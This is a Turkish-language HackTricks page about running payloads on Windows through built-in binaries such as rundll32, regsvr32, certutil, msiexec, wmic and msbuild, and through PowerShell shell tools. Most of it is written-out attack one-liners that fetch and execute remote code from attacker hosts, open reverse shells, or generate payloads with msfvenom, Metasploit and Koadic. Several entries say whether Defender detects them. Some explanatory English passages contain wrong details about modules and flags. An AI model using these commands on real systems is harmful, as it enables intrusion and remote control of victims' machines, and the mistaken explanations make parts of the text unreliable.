**Defender tarafından tespit edildi**

**Rundll32 - sct**

[**Buradan**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**

Rundll32 is a Windows utility that allows the execution of DLL files. Metasploit, on the other hand, is a powerful framework used for penetration testing and exploiting vulnerabilities.

Metasploit provides a module called `exploit/windows/local/hta_print_uaf` that leverages the `rundll32.exe` utility to execute malicious code. This module takes advantage of a use-after-free vulnerability in Internet Explorer to gain remote code execution on the target system.

To use this module, follow these steps:

1. Set the required options:
   - `SESSION`: The session to run the exploit on.
   - `LHOST`: The IP address of the local machine.
   - `LPORT`: The port to listen on for the reverse shell.

2. Run the exploit:
   ```
   exploit
   ```

Once the exploit is successful, you will have a reverse shell on the target system, allowing you to execute commands and interact with the compromised machine.

Note: This module is only effective against systems running Internet Explorer versions 9 to 11 on Windows 7 and Windows 8.1.
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**

Rundll32 is a Windows utility that allows the execution of DLL files as functions. This can be leveraged by attackers to load malicious DLLs and execute arbitrary code on a target system.

Koadic is a post-exploitation tool that utilizes the Rundll32 utility to establish a command and control (C2) channel with a compromised Windows machine. It provides a powerful framework for remote access and control, allowing an attacker to perform various actions on the compromised system.

To use Koadic, the attacker needs to generate a malicious DLL payload and upload it to the target system. This payload can be created using the Koadic framework, which provides a range of options for customization. Once the payload is uploaded, the attacker can use the Rundll32 utility to execute the malicious DLL and establish a C2 channel.

Once the C2 channel is established, the attacker can remotely control the compromised system, execute commands, exfiltrate data, and perform other malicious activities. Koadic provides a wide range of features and modules that can be used to carry out different post-exploitation tasks.

It is important to note that the use of Rundll32 and Koadic for malicious purposes is illegal and unethical. This information is provided for educational purposes only, to raise awareness about potential security risks and to help defenders protect their systems against such attacks.
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

* [Buradan](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/) ulaşabilirsiniz.
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
**Defender tarafından tespit edildi**

#### Regsvr32 -sct

[**Buradan**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
```markup
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**

Regsvr32 is a Windows command-line utility used to register and unregister DLL files. However, it can also be used as a technique for executing malicious code on a target system. In this case, we will explore how to use Regsvr32 with Metasploit to gain remote access to a Windows machine.

First, we need to generate a malicious DLL file using the `msfvenom` tool in Metasploit. This DLL file will contain our payload, which is the code we want to execute on the target system. We can use various payload options, such as a reverse shell or a Meterpreter session.

Once we have generated the malicious DLL file, we need to host it on a web server or transfer it to the target system. We can use tools like `python -m SimpleHTTPServer` to quickly set up a web server and serve the file.

Next, we need to create a malicious command that will be executed by Regsvr32. This command will include the URL or local path to the malicious DLL file. For example:

```
regsvr32 /s /n /u /i:http://attacker-ip/malicious.dll
```

The `/s` flag suppresses any dialog boxes, the `/n` flag specifies that the DLL file should not be registered, the `/u` flag unregisters the DLL file, and the `/i` flag specifies the URL or local path to the DLL file.

Once we have the command ready, we can execute it on the target system using various methods, such as social engineering or exploiting a vulnerability. When the command is executed, Regsvr32 will download and execute the malicious DLL file, giving us remote access to the target system.

It is important to note that this technique may be detected by antivirus software, so it is recommended to use evasion techniques or test it in a controlled environment.

Overall, using Regsvr32 with Metasploit can be an effective way to gain remote access to a Windows machine and carry out further exploitation or post-exploitation activities.
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Koadic zombi bir stager olan regsvr kullanarak çok kolay bir şekilde indirilebilir ve çalıştırılabilir**

## Certutil

* [Buradan](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/) indirin

Bir B64dll indirin, çözümleyin ve çalıştırın.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Bir B64exe indirin, onu çözümleyin ve çalıştırın.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Defender tarafından tespit edildi**


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Metasploit, birçok farklı saldırı vektörünü kullanarak hedef sistemlere sızmayı sağlayan bir güvenlik aracıdır. Metasploit Framework, saldırıları gerçekleştirmek için bir dizi modül ve araç sağlar. Bu modüller, hedef sistemdeki zayıflıkları kullanarak sızma işlemini gerçekleştirir.

Metasploit, Windows işletim sistemlerinde Cscript'i kullanarak hedef sistemlere sızma yeteneğine sahiptir. Cscript, Windows komut satırında çalışan bir Microsoft Scripting Host betik yürütücüsüdür. Bu betik yürütücüsü, Windows sistemlerindeki VBScript ve JScript betiklerini çalıştırmak için kullanılır.

Metasploit, Cscript'i kullanarak hedef sistemde bir komut kabuğu açabilir. Bu, saldırganın hedef sistemde komutlar çalıştırmasına ve sistem üzerinde tam kontrol elde etmesine olanak tanır. Cscript kullanarak açılan komut kabuğu, saldırganın hedef sistemdeki dosyaları okumasına, yazmasına ve silmesine izin verir.

Cscript kullanarak hedef sistemde bir komut kabuğu açmak için, Metasploit'in `exploit/windows/local/bypassuac_eventvwr` modülü kullanılabilir. Bu modül, hedef sistemdeki UAC (User Account Control) mekanizmasını atlayarak Cscript'i kullanarak bir komut kabuğu açar.

Bu modülü kullanmak için, `use exploit/windows/local/bypassuac_eventvwr` komutunu kullanın ve ardından `set SESSION <session_id>` komutunu kullanarak hedef oturumunu belirtin. Son olarak, `exploit` komutunu kullanarak saldırıyı gerçekleştirin.

Bu yöntem, hedef sistemdeki güvenlik duvarı ve antivirüs programları tarafından tespit edilme riski taşır. Bu nedenle, saldırıyı gerçekleştirmeden önce hedef sistemdeki güvenlik önlemlerinin analiz edilmesi önemlidir.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Defender tarafından tespit edildi**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Ağ çağrısı gerçekleştiren işlem: **svchost.exe**\
Disk üzerine yazılan yük: **WebDAV istemcisi yerel önbelleği**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Defender tarafından tespit edildi**

## **MSIExec**

Saldırgan
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Kurban:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Tespit Edildi**

## **Wmic**

* [Buradan](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
wmic os get /format:"https://webserver/payload.xsl"
```
Örnek xsl dosyası [buradan](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7) alınmıştır:
```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**Tespit edilmedi**

**Stager wmic kullanarak çok kolay bir şekilde bir Koadic zombie indirebilir ve çalıştırabilirsiniz**

## Msbuild

* [Buradan](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/) indirebilirsiniz
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Bu teknikle Uygulama Beyaz Listeleme ve Powershell.exe kısıtlamalarını atlayabilirsiniz. Bir PS kabuğu ile karşılaşacaksınız.\
Sadece bunu indirin ve çalıştırın: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Tespit edilmedi**

## **CSC**

Kurban makinede C# kodunu derleyin.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
İşte temel bir C# ters kabuk indirebilirsiniz: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Algılanmadı**

## **Regasm/Regsvc**

* [Buradan](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
**Denemedim**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf

* [Buradan](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
**Denemedim**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powershell Kabukları

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

**Shells** klasöründe birçok farklı kabuk bulunmaktadır. Invoke-_PowerShellTcp.ps1_ betiğini indirmek ve çalıştırmak için betiğin bir kopyasını oluşturun ve dosyanın sonuna ekleyin:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Victim'in bilgisayarında betiği bir web sunucusunda yayınlayın ve çalıştırın:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender henüz bunu zararlı kod olarak algılamıyor (henüz, 3/04/2019).

**TODO: Diğer nishang kabuklarını kontrol et**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

İndirin, bir web sunucusu başlatın, dinleyiciyi başlatın ve kurbanın sonunda çalıştırın:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender henüz (3/04/2019 itibariyle) zararlı kod olarak algılamıyor.

**Powercat tarafından sunulan diğer seçenekler:**

Bind kabukları, Ters kabuk (TCP, UDP, DNS), Port yönlendirme, yükleme/indirme, Yük oluşturma, Dosya sunma...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Bir powershell başlatıcısı oluşturun, bir dosyaya kaydedin ve onu indirip çalıştırın.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Kötü amaçlı kod olarak tespit edildi**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Unicorn kullanarak metasploit arka kapısının bir powershell versiyonunu oluşturun.
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Oluşturulan kaynakla msfconsole'ı başlatın:
```
msfconsole -r unicorn.rc
```
Victim üzerinde _powershell\_attack.txt_ dosyasını sunan bir web sunucusu başlatın ve aşağıdaki komutu çalıştırın:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Kötü amaçlı kod olarak tespit edildi**

## Daha Fazla

[PS>Attack](https://github.com/jaredhaight/PSAttack) Bazı saldırgan PS modülleri önceden yüklenmiş PS konsolu (şifreli)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) Bazı saldırgan PS modülleri ve proxy tespiti ile PS konsolu (IEX)

## Referanslar

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da** takip edin.
* Hacking hilelerinizi göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek **hacking hilelerinizi paylaşın**.

</details>
